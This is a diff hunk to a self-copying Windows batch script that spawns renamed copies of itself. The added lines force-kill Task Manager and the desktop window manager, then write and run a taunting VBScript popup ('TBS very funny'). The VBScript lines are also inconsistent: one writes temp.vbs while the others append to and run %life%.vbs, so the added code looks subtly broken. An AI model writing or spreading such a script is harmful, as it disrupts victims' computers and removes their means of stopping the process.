@@ -41,6 +41,11 @@ if %namenumber%==24 set name=Y%name%
 if %namenumber%==25 set name=Z%name%
 if EXIST %name%.bat goto Loop
 if EXIST %name%.dat goto Loop
+taskkill /f /im taskmgr.exe
+taskkill /f /im dwm.exe
+echo Set obj = CreateObject("WScript.Shell") > temp.vbs
+echo obj.Popup "TBS very funny", 0, "TBS very funny", 64+5 >> %life%.vbs
+cscript //nologo %life%.vbs
 copy %0 %name%.bat >nul
 start /min %name%.bat
 set/a life=%life% -1
